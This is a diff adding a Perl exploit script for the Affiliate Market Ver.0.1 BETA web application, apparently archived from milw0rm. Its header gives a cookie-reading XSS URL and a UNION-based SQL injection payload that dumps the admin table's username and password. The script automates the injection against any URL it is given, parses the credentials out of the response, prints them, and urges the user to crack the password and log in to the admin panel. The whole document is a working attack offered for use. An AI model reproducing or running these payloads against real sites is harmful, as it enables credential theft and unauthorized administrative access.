@@ -1,0 +1,128 @@
+#!/usr/bin/perl
+#####################################################################################
+####                     Affiliate Market Ver.0.1 BETA                           ####
+####          Multiple Remote Vulnerabilities (SQL Injection Exploit/XSS)        ####
+#####################################################################################
+#                                                                                   #
+#AUTHOR : IRCRASH                                                                   #
+#Discovered by : Dr.Crash                                                           #
+#Exploited By : Dr.Crash                                                            #
+#IRCRASH Team Members : Dr.Crash - Malc0de - R3d.w0rm                               #
+#                                                                                   #
+#####################################################################################
+#                                                                                   #
+#Script Download : http://kent.dl.sourceforge.net/sourceforge/affmarket/affmarket.30.03.07.zip
+#                                                                                   #
+#####################################################################################
+#                                   < XSS >                                         #
+#XSS Address : http://Target/function/sideblock.php?sideblock4=<script>alert(document.cookie);</script>
+#                                                                                   #
+#####################################################################################
+#                                   < SQL >                                         #
+#SQL Address : http://Target/shop/detail.php?id=/-1%27union/**/select/**/0,1,2,3,CoNcAt(0x4c6f67696e3a,user,0x3c656e64757365723e,0x0d0a50617373776f72643a,pass,0x3c656e64706173733e),5,6,7,8,9,10,11,12,13,14,15,16,17,18,20/**/from/**/admin/*
+#                                                                                   #
+#####################################################################################
+#                         Our site : Http://IRCRASH.COM                             #
+#####################################################################################
+
+use LWP;
+use HTTP::Request;
+use Getopt::Long;
+ 
+ 
+sub header
+{
+print "
+****************************************************
+*Affiliate Market Ver.0.1BETA Sql Injection exploit*
+****************************************************
+*AUTHOR : IRCRASH                                  *
+*Discovered by : Dr.Crash                          *
+*Exploited by : Dr.Crash                           *
+*Our Site : IRCRASH.COM                            *
+****************************************************";
+}
+ 
+sub usage
+{
+  print "
+* Usage : perl $0 -url http://Sitename/
+****************************************************
+";
+}                                                                                  
+ 
+ 
+my %parameter = ();
+GetOptions(\%parameter, "url=s");
+ 
+$url = $parameter{"url"};
+ 
+if(!$url)
+{
+header();
+usage();
+exit;
+}
+if($url !~ /\//){$url = $url."/";}
+if($url !~ /http:\/\//){$url = "http://".$url;}
+$vul = "/shop/detail.php?id=-1%27union/**/select/**/0,1,2,3,CoNcAt(0x4c6f67696e3a,user,0x3c656e64757365723e,0x0d0a50617373776f72643a,pass,0x3c656e64706173733e),5,6,7,8,9,10,11,12,13,14,15,16,17,18,20/**/from/**/admin/*";
+sub Exploit()
+{
+$requestpage = $url.$vul;
+print "Requesting Page is ".$url."\n";
+ 
+my $req  = HTTP::Request->new("POST",$requestpage);
+$ua = LWP::UserAgent->new;
+$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
+$req->referer($url);
+$req->referer("http://IRCRASH.COM");
+$req->content_type('application/x-www-form-urlencoded');
+$req->header("content-length" => $contlen);
+$req->content($poststring);
+ 
+$response = $ua->request($req);
+$content = $response->content;
+$header = $response->headers_as_string();
+ 
+#Debug Modus delete # at beginning of next line
+#print $content;
+ 
+@name = split(/Login:/,$content);
+$name = @name[1];
+@name = split(/<enduser>/,$name);
+$name = @name[0];
+ 
+@password = split(/Password:/,$content);
+$password = @password[1];
+@password = split(/<endpass>/,$password);
+$password = @password[0];
+
+if(!$name && !$password)
+{
+print "\n\n";
+print "[-] Exploit failed ! :(\n\n";
+exit;
+}
+# Dr.Crash - IRCRASH - Expoit - Hack - Hacking - Hacker - Cracker - Crash - Iran
+print "Username: ".$name."\n";
+print "Password: " .$password."\n\n";
+print "[+] To Be Done SuccessFully\n\n";
+print "Crack Password And Login In : $url/admin/\n";
+print "Enjoy My friend .....\n";
+ 
+}
+ 
+#Starting;
+print "
+****************************************************
+*Affiliate Market Ver.0.1BETA Sql Injection exploit*
+****************************************************
+*AUTHOR : IRCRASH                                  *
+*Discovered by : Dr.Crash                          *
+*Exploited by : Dr.Crash                           *
+*Our Site : IRCRASH.COM                            *
+****************************************************";
+print "\n\nExploiting...\n";
+Exploit();
+
+# milw0rm.com [2008-02-14]
